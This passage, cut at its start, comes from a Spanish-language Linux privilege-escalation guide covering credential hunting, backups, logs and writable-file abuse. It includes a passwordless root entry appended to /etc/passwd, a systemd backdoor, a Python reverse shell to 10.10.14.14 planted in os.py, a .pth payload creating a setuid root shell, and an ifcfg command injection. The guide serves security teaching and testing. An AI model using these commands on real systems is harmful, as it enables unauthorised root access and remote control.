hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Por ejemplo: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Ahora puedes usar el comando `su` con `hacker:hacker`

Como alternativa, puedes usar las siguientes líneas para añadir un usuario ficticio sin contraseña.\
ADVERTENCIA: podrías reducir la seguridad actual de la máquina.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOTA: En las plataformas BSD, `/etc/passwd` se encuentra en `/etc/pwd.db` y `/etc/master.passwd`; además, `/etc/shadow` se renombra como `/etc/spwd.db`.

Deberías comprobar si puedes **escribir en algunos archivos sensibles**. Por ejemplo, ¿puedes escribir en algún **archivo de configuración de un servicio**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Por ejemplo, si la máquina ejecuta un servidor **tomcat** y puedes **modificar el archivo de configuración del servicio Tomcat dentro de /etc/systemd/,** entonces puedes modificar las líneas:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Tu backdoor se ejecutará la próxima vez que se inicie tomcat.

### Revisar carpetas

Las siguientes carpetas pueden contener copias de seguridad o información interesante: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probablemente no podrás leer la última, pero inténtalo)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Ubicaciones extrañas/archivos propios

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Archivos modificados en los últimos minutos

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Archivos de bases de datos SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

En las bases de datos de aplicaciones que se puedan leer, revisa los nombres de tablas y columnas en busca de nombres de usuario y hashes de contraseñas. Encontrar un hash, recuperar su contraseña y demostrar que se reutiliza en una cuenta local son pasos distintos; una cadena hexadecimal genérica de 32 caracteres no basta para inferir que sea MD5 ni que permita acceder a una cuenta.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Si el historial legible del shell contiene un comando `sudo` seguido de una línea corta que parece una contraseña, inspecciona manualmente las líneas circundantes. Una contraseña introducida en el prompt normal de `sudo` no se guarda en el historial del shell; una línea posterior solo podría ser una entrada accidental en el shell, no una prueba de que sea una contraseña válida. El marcador `.sudo_as_admin_successful` registra un uso anterior, no una autorización actual.

### Archivos ocultos

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Scripts/Binarios en PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Archivos web**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Backups**

Inspecciona los archivos legibles dentro de los directorios de backup, así como los archivos cuyos **nombres** contengan `backup`: un archivo comprimido con un nombre opaco o una extensión cifrada aún puede exponer datos antiguos de aplicaciones. Un archivo comprimido cifrado es solo un posible punto de exposición. La recuperación de la contraseña, la inspección de su contenido, la recuperación de un hash de aplicación y la reutilización de esa contraseña para una cuenta Unix son pasos distintos que deben verificarse; un hash en un archivo comprimido no demuestra que permita iniciar sesión localmente.

Los backups legibles de máquinas virtuales también merecen revisión. Una configuración `.vbox` de VirtualBox puede identificar imágenes `.vdi` adjuntas y contener metadatos de claves de disco cifradas; [VirtualBox documenta que la clave de datos cifrados se almacena en la configuración de la VM](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Tanto la configuración como la imagen deben ser accesibles para poder revisar el disco sin conexión. Un volumen guest puede tener su propia [capa de cifrado LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), que requiere una clave aparte. Incluso tras un descifrado autorizado, los scripts o la configuración antiguos pueden contener una contraseña; comprueba que la credencial siga siendo válida para una cuenta del host y que su política efectiva de `sudo` permita ejecutar un comando privilegiado antes de considerar esto una escalada local. Durante la enumeración pasiva, inventaría las rutas y los permisos sin copiar, descifrar ni montar imágenes.

Al inspeccionar un archivo comprimido legible, lista los nombres de sus elementos antes de extraer nada: puede contener archivos de autenticación ocultos, material de códigos de recuperación o claves SSH, aunque las copias activas estén protegidas. Los nombres de archivo solo son indicios; verifica por separado el material y cualquier reutilización de cuentas.

Prioriza los **archivos comprimidos legibles propiedad de otro usuario** en los directorios de backup, especialmente los que pertenecen a root y aquellos accesibles mediante la pertenencia a grupos. Un archivo comprimido antiguo puede contener una configuración o un secreto de autenticación aunque la copia activa esté protegida. Para una interfaz local de backups como [Backrest](https://garethgeorge.github.io/backrest/), comprueba la cuenta efectiva del servicio y si un usuario con menos privilegios puede leer su configuración o autenticarse en la interfaz. Sus [hooks](https://garethgeorge.github.io/backrest/docs/hooks) y su [interfaz de comandos restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) pueden operar con los privilegios de archivos y comandos del daemon; un listener loopback por sí solo no determina el impacto. `passwordBcrypt` de Backrest es un hash bcrypt codificado en base64 en su [código de autenticación](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), no una contraseña en texto plano. Confirma la identidad del servicio, que las credenciales sean utilizables y el acceso al plan o repositorio pertinente antes de considerar un archivo comprimido o una interfaz expuestos como un límite de privilegios.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Archivos conocidos que contienen contraseñas

Lee el código de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS): busca **varios archivos posibles que podrían contener contraseñas**.\
**Otra herramienta interesante** que puedes usar para esto es: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), una aplicación de código abierto que permite recuperar muchas contraseñas almacenadas en un equipo local con Windows, Linux o Mac.

Si se puede leer `/etc/guacamole/guacamole.properties`, revisa su configuración de conexión a bases de datos `mysql-*`, `postgresql-*` o `sqlserver-*`. Si la cuenta tiene autorización para leer las tablas JDBC de Guacamole, `guacamole_connection_parameter` podría contener valores guardados de `username`, `password`, `private-key` o `passphrase` de SSH. Empieza por los ID de conexión y los nombres de los parámetros y, luego, inspecciona solo las filas relevantes; un valor guardado podría ser un token dinámico o una referencia a un vault, en lugar de un secreto reutilizable. Consulta el [esquema JDBC de Guacamole](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) y los [parámetros de conexión SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

El [gestor de contraseñas pswm](https://github.com/Julynx/pswm#usage) almacena por defecto un vault cifrado en `~/.local/share/pswm/pswm`. Si puedes ver el vault de otro usuario, comprueba quién es su propietario y si tu cuenta realmente puede leerlo. La ruta del vault por sí sola no revela credenciales: recuperar su contraseña maestra, encontrar una contraseña de cuenta reutilizable y confirmar los privilegios de esa cuenta son pasos independientes.

La [base de datos predeterminada de Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) es `~/.passpie/`, con un anillo de claves `.keys` y archivos de credenciales `.pass` cifrados en directorios de grupo. Poder ver un directorio de base de datos solo indica una ruta que conviene revisar: confirma el acceso a la clave y a la entrada cifrada pertinente, cualquier frase de contraseña maestra necesaria y si una credencial recuperada pertenece a una cuenta con más privilegios. Passpie también admite [rutas de bases de datos personalizadas](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), por lo que la ruta predeterminada no es exhaustiva. La enumeración automatizada debe mostrar metadatos sin exportar credenciales ni imprimir material de claves.

### Registros

Si puedes leer los registros, quizá encuentres **información interesante o confidencial en ellos**. Cuanto más extraño sea el registro, más interesante será (probablemente).\
Además, algunos **registros de auditoría** mal configurados (¿con backdoor?) podrían permitirte **registrar contraseñas** en ellos, como se explica en esta publicación: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Para **leer logs, el grupo** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) será muy útil.

### Archivos de shell

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Búsqueda genérica de credenciales/regex

También deberías buscar archivos que contengan la palabra "**password**" en su **nombre** o en su **contenido**, y buscar IP y correos electrónicos en los logs, o expresiones regulares para hashes.\
No voy a enumerar aquí cómo hacer todo esto, pero si te interesa, puedes consultar las últimas comprobaciones que realiza [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Archivos con permisos de escritura

### Python library hijacking

Si sabes **desde dónde** se ejecutará un script de Python y **puedes escribir en** esa carpeta o **modificar bibliotecas de Python**, puedes modificar la biblioteca del SO y ponerle un backdoor (si puedes escribir en la ubicación desde la que se ejecutará el script de Python, copia y pega la biblioteca os.py).

Para **ponerle un backdoor a la biblioteca**, simplemente añade la siguiente línea al final de la biblioteca os.py (cambia la IP y el PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `.pth` escribible procesado por `site.addsitedir()`

No trates `site.addsitedir(DIR)` como equivalente a `sys.path.append(DIR)`. También procesa todos los archivos `*.pth` de `DIR`. Una línea que comienza con `import` seguido de un espacio o tabulación se ejecuta como código Python. En cambio, las líneas de rutas se resuelven en relación con el directorio del sitio y se añaden solo si existen.<sup>[[38]](#references)</sup>

Esto se convierte en una escalada de privilegios cuando un programa Python permitido por sudo o con otros privilegios llama a `site.addsitedir()` con un directorio en el que el usuario actual o uno de sus grupos puede escribir. El código `.pth` se ejecuta mientras el programa privilegiado configura su ruta de importación, antes de que se ejecute su acción habitual.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

El contenido ejecutable de `.pth` debe caber en una sola línea, pero los puntos y coma permiten incluir varias instrucciones. Por ejemplo, una ruta de ejecución como root puede crear una copia de Bash con setuid; ejecuta Bash con `-p` para que conserve su ID efectivo.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

La opción `-S` solo desactiva la inicialización automática de `site` de Python. No protege un programa que importa explícitamente `site` y llama a `site.addsitedir()`. Elimina los directorios modificables por un atacante de las rutas de importación privilegiadas y exige que el directorio y sus archivos `.pth` sean propiedad exclusiva del administrador privilegiado y que solo este pueda escribir en ellos.<sup>[[38]](#references)[[39]](#references)</sup>

### Explotación de logrotate

Un trabajo privilegiado de `logrotate` puede crear una ruta de escritura de archivos entre usuarios cuando rota realmente un log dentro de un directorio que un usuario con menos privilegios puede reemplazar o redirigir durante la rotación. Que un log sea modificable es solo un indicio. Confirma la regla activa exacta y sus directivas `create`, `olddir` y `su`; la identidad efectiva del planificador; los permisos de escritura y búsqueda en el directorio padre del log; y si la compilación instalada y la política permiten cambiar el destino. Además, un shell privilegiado posterior debe cargar el archivo resultante para que la escritura en un archivo de inicio se convierta en ejecución de comandos. Inspecciona la programación, la regla, la versión y el empaquetado, así como los metadatos de las rutas, sin provocar una rotación ni intentar la condición de carrera.

> [!TIP]
> No consideres `3.18.0` ni ninguna cadena de versión, por sí sola, un límite para determinar si es explotable. El [registro de cambios de upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) documenta mejoras de seguridad para directorios y symlinks en varias versiones, y las distribuciones pueden aplicar correcciones retroactivamente. El [manual de upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) recomienda usar `su` cuando root rota logs en directorios controlados por usuarios sin privilegios; verifica la regla efectiva y el comportamiento real.

Puedes encontrar información más detallada sobre la vulnerabilidad en esta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Puedes explotar esta vulnerabilidad con [**logrotten**](https://github.com/whotwagner/logrotten).

Esta vulnerabilidad es muy similar a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logs de nginx),** así que, cuando descubras que puedes alterar logs, comprueba quién los administra y si puedes escalar privilegios sustituyendo los logs por symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referencia de la vulnerabilidad:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Un archivo `ifcfg-*` es un indicio que conviene investigar cuando un usuario con menos privilegios puede crearlo o modificarlo **y** una ruta privilegiada de activación de red va a leer ese archivo exacto. Confirma los permisos efectivos del archivo y del directorio, la interfaz seleccionada, la implementación instalada de `ifup`/`ifdown` y quién la invoca. Que un archivo sea modificable no provoca ejecución por sí solo. La [guía de redes de RHEL 7 de Red Hat](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) distingue los scripts de red heredados de NetworkManager: este último no activa por sí mismo los primeros. La [documentación de RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) indica que, de forma predeterminada, `ifup`/`ifdown` usan NetworkManager, mientras que el paquete heredado opcional proporciona scripts de shell.

En un sistema que realmente utilice scripts heredados con privilegios, una asignación `ifcfg-*` sin comillas y procesada como código de shell, como `NAME=`, puede cruzar un límite de ejecución de código. Verifica el analizador, el valor y la ruta de activación exactos; no deduzcas que se interpreta como shell por el nombre del archivo ni por la presencia de NetworkManager. Un wrapper permitido por sudo que escriba la entrada del usuario en un archivo `ifcfg-*` y luego invoque el `ifup` heredado constituye otra ruta hacia este límite, incluso si quien lo invoca no puede editar directamente el archivo.

Por ejemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Ten en cuenta el espacio en blanco entre Network y /bin/id_)

### **init, init.d, systemd y rc.d**

El directorio `/etc/init.d` contiene **scripts** para System V init (SysVinit), el **sistema clásico de gestión de servicios de Linux**. Incluye scripts para `start`, `stop`, `restart` y, a veces, `reload` de servicios. Estos se pueden ejecutar directamente o mediante enlaces simbólicos ubicados en `/etc/rc?.d/`. En los sistemas Redhat hay una ruta alternativa: `/etc/rc.d/init.d`.

Por otro lado, `/etc/init` está asociado con **Upstart**, un sistema más reciente de **gestión de servicios** introducido por Ubuntu, que utiliza archivos de configuración para administrar servicios. A pesar de la transición a Upstart, los scripts de SysVinit siguen utilizándose junto con las configuraciones de Upstart gracias a una capa de compatibilidad de Upstart.

**systemd** surge como un gestor moderno de inicialización y servicios, que ofrece funciones avanzadas como el inicio de daemons bajo demanda, la gestión de automount y las instantáneas del estado del sistema. Organiza los archivos en `/usr/lib/systemd/` para los paquetes de la distribución y en `/etc/systemd/system/` para las modificaciones del administrador, lo que agiliza el proceso de administración del sistema.<sup>[[21]](#references)</sup>

## Otros trucos

### Escalada de privilegios mediante NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escapar de shells restringidas


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../../network-services-pentesting/cisco-sd-wan-manager-local-privilege-escalation.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Los Android rooting frameworks suelen enganchar una syscall para exponer funciones privilegiadas del kernel a un manager en userspace. Una autenticación débil del manager (por ejemplo, comprobaciones de firma basadas en el orden de los FD o esquemas de contraseñas deficientes) puede permitir que una app local suplante al manager y escale a root en dispositivos que ya tienen root. Aquí encontrarás más información y detalles de explotación:


{{#ref}}
../../../mobile-pentesting/android-app-pentesting/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Detección de servicios de VMware Tools con LPE (CWE-426) mediante exec basado en regex (CVE-2025-41244)

La detección de servicios basada en regex en VMware Tools/Aria Operations puede extraer una ruta de binario de las líneas de comandos de los procesos y ejecutarlo con -v en un contexto privilegiado. Los patrones permisivos (por ejemplo, los que usan \S) pueden coincidir con listeners preparados por un atacante en ubicaciones con permisos de escritura (por ejemplo, /tmp/httpd), lo que permite ejecutar código como root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Aquí encontrarás más información y un patrón generalizable a otras herramientas de detección y monitorización:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Protecciones de seguridad del kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Más ayuda

[Binarios estáticos de impacket](https://github.com/ropnop/impacket_static_binaries)

## Herramientas de privesc para Linux/Unix

### **Mejor herramienta para buscar vectores de escalada local de privilegios en Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opción -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumera vulnerabilidades del kernel en Linux y MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (acceso físico):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilación de más scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)



## References

- [1] [0xdf – HTB Planning (privesc mediante la interfaz de Crontab y reutilización de credenciales de zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: payload .text_sig falsificado para un monitor ejecutado por cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: omisión de Neighborhood Watch (secuestro de PATH mediante sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Escalada básica de privilegios en Linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Guía de escalada de privilegios en Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Ataque y defensa: técnicas de escalada de privilegios en Linux de 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [¡Nadie espera la ejecución de comandos!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (escalada de privilegios en Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Guía de los ejercicios de laboratorio - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: consejos y trucos para la escalada de privilegios en Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: herramienta de enumeración y escalada de privilegios en Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [¿Qué es un socket?](https://www.linux.com/news/what-socket/)
- [15] [Writeup de Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Conoce D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Escalada de privilegios en Linux mediante ejecutables SUID](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo, parte 2: escalada de privilegios en Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Cómo gestionar ACL en Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Root en Redhat/CentOS mediante network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [¿Qué es systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (inyección aritmética en bash mediante logs, cadena completa)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Manual de GNU Bash – BASH_ENV (archivo de inicio no interactivo)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + privesc mediante enlace simbólico de TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (copia de pg_basebackup mediante cron → bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Si le pones nombre, VMware lo eleva (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: escalada de privilegios mediante Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Vulnerabilidades de escalada de privilegios de Sudo CVE-2025-32462 y CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Directorios de repositorio PYC](https://peps.python.org/pep-3147/)
- [32] [Documentación de Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit, incidencia n.º 74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet de @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Registro de contraseñas en Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Detalles de una condición de carrera en logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Documentación de Python 3.10 – `site` y archivos de configuración de rutas](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
